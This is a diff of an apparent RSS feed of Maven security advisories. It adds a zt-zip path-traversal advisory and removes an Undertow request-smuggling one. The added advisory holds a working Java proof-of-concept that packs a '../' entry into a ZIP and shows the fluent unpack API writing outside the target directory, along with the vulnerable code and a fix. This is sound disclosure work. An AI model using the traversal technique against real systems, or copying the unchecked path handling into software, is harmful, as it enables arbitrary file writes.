@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://prajeetguha.github.io/github-advisory-database-rss/maven.rss</id>
     <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
-    <updated>2026-11-09T09:13:45.119Z</updated>
+    <updated>2026-11-09T20:27:26.219Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
     <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
@@ -11,6 +11,148 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[org.zeroturnaround:zt-zip] zt-zip: Path traversal in fluent API unpack]]></title>
+        <id>https://github.com/advisories/GHSA-52c6-99qm-3hqr</id>
+        <link href="https://github.com/advisories/GHSA-52c6-99qm-3hqr"/>
+        <updated>2026-11-09T18:47:30.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>org.zeroturnaround:zt-zip</td>
+<td><code>&lt; 1.18.0</code></td>
+<td><code>1.18.0</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary</h3>
+<p><code>ZipUtil.unpack(...)</code> rejects ZIP entries that escape the target output directory, but the <code>Zips</code> fluent API appears to use a separate unpack implementation that does not apply the same destination-boundary check.</p>
+<p>A ZIP entry such as:</p>
+<pre><code class="language-text">../escape/poc.txt
+</code></pre>
+<p>is written outside the configured destination directory when processed with:</p>
+<pre><code class="language-java">Zips.get(zip).unpack().destination(outputDir).process();
+</code></pre>
+<p>The transformer branch is affected as well.</p>
+<h3 id="tested-version">Tested Version</h3>
+<p>commit: 067935dca375500d3ff025aafcdf0e4283931b1a</p>
+<h3 id="root-cause">Root Cause</h3>
+<p>In <code>src/main/java/org/zeroturnaround/zip/Zips.java</code>, <code>Zips.UnpackingCallback.process(...)</code> builds the output file directly from the ZIP entry name:</p>
+<pre><code class="language-java">String entryName = zipEntry.getName();
+File file = new File(destination, entryName);
+</code></pre>
+<p>The method then creates directories/files and copies content to that path:</p>
+<pre><code class="language-java">FileUtils.forceMkdir(file.getParentFile());
+file.createNewFile();
+FileUtils.copy(in, file);
+</code></pre>
+<p>When a transformer is configured, the same <code>file</code> is passed to <code>transformIntoFile(...)</code>.</p>
+<p>There does not appear to be a canonical path check before these filesystem writes, so <code>../</code> entries can resolve outside <code>destination</code>.</p>
+<h3 id="minimal-reproduction">Minimal Reproduction</h3>
+<pre><code class="language-java">import java.io.*;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.*;
+import java.util.zip.*;
+
+import org.zeroturnaround.zip.ZipUtil;
+import org.zeroturnaround.zip.Zips;
+import org.zeroturnaround.zip.transform.ZipEntryTransformer;
+
+public class ZipsTraversalPoc {
+  public static void main(String[] args) throws Exception {
+    Path work = Files.createTempDirectory("ztzip-zips-poc");
+    Path zip = work.resolve("poc.zip");
+    Path escaped = work.resolve("escape").resolve("poc.txt");
+    String entryName = "../escape/poc.txt";
+
+    Files.createDirectories(escaped.getParent());
+
+    try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zip))) {
+      zos.putNextEntry(new ZipEntry(entryName));
+      zos.write("plain branch\n".getBytes(StandardCharsets.UTF_8));
+      zos.closeEntry();
+    }
+
+    Path zipUtilOut = work.resolve("ziputil-out");
+    Files.createDirectories(zipUtilOut);
+    try {
+      ZipUtil.unpack(zip.toFile(), zipUtilOut.toFile());
+      System.out.println("ZIPUTIL_REJECTED=false");
+    }
+    catch (Throwable t) {
+      System.out.println("ZIPUTIL_REJECTED=" + t.getClass().getName());
+    }
+    System.out.println("ZIPUTIL_ESCAPED_EXISTS=" + Files.exists(escaped));
+
+    Files.deleteIfExists(escaped);
+
+    Path zipsOut = work.resolve("zips-out");
+    Files.createDirectories(zipsOut);
+    Zips.get(zip.toFile()).unpack().destination(zipsOut.toFile()).process();
+    System.out.println("ZIPS_PLAIN_ESCAPED_EXISTS=" + Files.exists(escaped));
+    System.out.println("ZIPS_PLAIN_ESCAPED_OUTSIDE_ROOT=" + !escaped.normalize().startsWith(zipsOut.normalize()));
+
+    Files.deleteIfExists(escaped);
+
+    Path zipsTransformOut = work.resolve("zips-transform-out");
+    Files.createDirectories(zipsTransformOut);
+    Zips.get(zip.toFile())
+        .unpack()
+        .destination(zipsTransformOut.toFile())
+        .addTransformer(entryName, new ZipEntryTransformer() {
+          public void transform(InputStream in, ZipEntry entry, ZipOutputStream out) throws IOException {
+            out.putNextEntry(new ZipEntry(entry.getName()));
+            out.write("transform branch\n".getBytes(StandardCharsets.UTF_8));
+            out.closeEntry();
+          }
+        })
+        .process();
+    System.out.println("ZIPS_TRANSFORM_ESCAPED_EXISTS=" + Files.exists(escaped));
+    System.out.println("ZIPS_TRANSFORM_ESCAPED_OUTSIDE_ROOT=" + !escaped.normalize().startsWith(zipsTransformOut.normalize()));
+  }
+}
+</code></pre>
+<p>Observed output:</p>
+<pre><code class="language-text">ZIPUTIL_REJECTED=org.zeroturnaround.zip.MaliciousZipException
+ZIPUTIL_ESCAPED_EXISTS=false
+ZIPS_PLAIN_ESCAPED_EXISTS=true
+ZIPS_PLAIN_ESCAPED_OUTSIDE_ROOT=true
+ZIPS_TRANSFORM_ESCAPED_EXISTS=true
+ZIPS_TRANSFORM_ESCAPED_OUTSIDE_ROOT=true
+</code></pre>
+<h3 id="expected-behavior">Expected Behavior</h3>
+<p><code>Zips.get(zip).unpack().destination(outputDir).process()</code> should reject traversal entries or otherwise ensure that the resolved output path remains inside <code>outputDir</code>.</p>
+<h3 id="impact">Impact</h3>
+<p>Applications that unpack attacker-controlled ZIP files through the <code>Zips</code> fluent API may allow arbitrary file writes outside the intended extraction directory, depending on filesystem permissions and application layout.</p>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<p>Apply the same destination-boundary validation used by <code>ZipUtil.unpack(...)</code> before any filesystem write in <code>Zips.UnpackingCallback.process(...)</code>.</p>
+<p>For example, compare canonical <code>Path</code> values before creating directories or files:</p>
+<pre><code class="language-java">file.getCanonicalFile().toPath()
+    .startsWith(destination.getCanonicalFile().toPath())
+</code></pre>
+<p>Regression tests should cover both:</p>
+<pre><code class="language-java">Zips.get(zip).unpack().destination(out).process();
+Zips.get(zip).unpack().destination(out).addTransformer(...).process();
+### References
+
+- &lt;https://github.com/zeroturnaround/zt-zip/security/advisories/GHSA-52c6-99qm-3hqr&gt;
+- &lt;https://nvd.nist.gov/vuln/detail/CVE-2026-63436&gt;
+- &lt;https://github.com/zeroturnaround/zt-zip/pull/180&gt;
+- &lt;https://github.com/zeroturnaround/zt-zip/commit/59a76ad576b0fcd50ea018e3608afb946c1492fd&gt;
+- &lt;https://github.com/zeroturnaround/zt-zip/releases/tag/v1.18.0&gt;
+- &lt;https://github.com/advisories/GHSA-52c6-99qm-3hqr&gt;
+</code></pre>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-52c6-99qm-3hqr</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-09T18:47:27.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[org.eclipse.hawkbit:hawkbit-ddi-resource] Eclipse hawkBit DDI has Privilege Escalation that allows Tenant-Isolated Firmware Exfiltration]]></title>
         <id>https://github.com/advisories/GHSA-92r3-p8c2-3fpx</id>
@@ -829,43 +971,5 @@ This issue affects Apache ActiveMQ: before 5.19.8, from 6.0.0 before 6.2.7; Apac
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-30T12:31:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[io.undertow:undertow-core] Undertow is Vulnerable to HTTP Request/Response Smuggling]]></title>
-        <id>https://github.com/advisories/GHSA-8v4x-mgvp-p658</id>
-        <link href="https://github.com/advisories/GHSA-8v4x-mgvp-p658"/>
-        <updated>2026-11-04T21:17:20.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>io.undertow:undertow-core</td>
-<td><code>&gt;= 2.3.0.Final, &lt; 2.3.25.Final</code></td>
-<td><code>2.3.25.Final</code></td>
-</tr>
-</tbody>
-</table>
-<p>A flaw was found in Undertow. This vulnerability allows a remote attacker to construct specially crafted requests where header names are parsed differently by Undertow compared to upstream proxies. This discrepancy in header interpretation can be exploited to launch request smuggling attacks, potentially bypassing security controls and accessing unauthorized resources.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28368">https://nvd.nist.gov/vuln/detail/CVE-2026-28368</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-28368">https://access.redhat.com/security/cve/CVE-2026-28368</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2443261">https://bugzilla.redhat.com/show_bug.cgi?id=2443261</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:25125">https://access.redhat.com/errata/RHSA-2026:25125</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:25126">https://access.redhat.com/errata/RHSA-2026:25126</a></li>
-<li><a href="https://github.com/undertow-io/undertow/commit/3ece0bf2b2cf5e01db8ca25e41b831e66d3f5961">https://github.com/undertow-io/undertow/commit/3ece0bf2b2cf5e01db8ca25e41b831e66d3f5961</a></li>
-<li><a href="https://github.com/undertow-io/undertow/commit/904e26f1be62fb00b440538608a9574839821878">https://github.com/undertow-io/undertow/commit/904e26f1be62fb00b440538608a9574839821878</a></li>
-<li><a href="https://github.com/undertow-io/undertow/commit/c5dc41479e9c3576552d7e98e31bb1c237ae155e">https://github.com/undertow-io/undertow/commit/c5dc41479e9c3576552d7e98e31bb1c237ae155e</a></li>
-<li><a href="https://github.com/advisories/GHSA-8v4x-mgvp-p658">https://github.com/advisories/GHSA-8v4x-mgvp-p658</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8v4x-mgvp-p658</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-27T18:31:27.000Z</published>
     </entry>
 </feed>
